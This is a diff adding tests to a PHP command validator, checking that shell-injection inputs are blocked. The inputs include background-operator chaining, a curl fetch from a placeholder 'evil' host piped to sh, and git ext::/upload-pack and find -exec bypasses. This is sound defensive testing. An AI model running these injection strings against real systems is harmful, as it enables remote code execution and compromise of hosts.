@@ -80,6 +80,46 @@ it('blocks dangerous patterns', function () {
     }
 });
 
+it('blocks the lone & background operator and # comment (BROWSERCON-1)', function () {
+    // The single '&' (run-in-background) and '#' (comment) were missing from the
+    // denylist — `git status & curl evil|sh #` bypassed the allowlist entirely.
+    $injections = [
+        'git status & curl http://evil/x -o /tmp/x',
+        'whoami & id',
+        'git status #x',
+        'ls -la & bash /tmp/x',
+        'ls (subshell)',
+        'ls !!',
+    ];
+
+    foreach ($injections as $cmd) {
+        $result = $this->validator->invoke($this->component, $cmd);
+        expect($result)->toBeString("Expected '{$cmd}' to be blocked");
+    }
+});
+
+it('blocks allowlist bypasses: tinker, find -exec, git ext:: (BROWSERCON-3)', function () {
+    $bypasses = [
+        'php artisan tinker --execute=phpinfo()',
+        'find . -maxdepth 0 -exec id +',
+        'git clone ext::sh -c id',
+        'git clone --upload-pack=id repo dst',
+        'git fetch --receive-pack=id',
+    ];
+
+    foreach ($bypasses as $cmd) {
+        $result = $this->validator->invoke($this->component, $cmd);
+        expect($result)->toBeString("Expected '{$cmd}' to be blocked");
+    }
+});
+
+it('rejectShellOperators blocks lone & and # (BROWSERCON-1)', function () {
+    foreach (['list & id', 'migrate #comment', 'up (x)', 'down !'] as $input) {
+        $result = $this->operatorCheck->invoke($this->component, $input);
+        expect($result)->toBeString("Expected rejectShellOperators to block '{$input}'");
+    }
+});
+
 it('blocks control characters', function () {
     $result = $this->validator->invoke($this->component, "ls\x00 -la");
     expect($result)->toBeString();
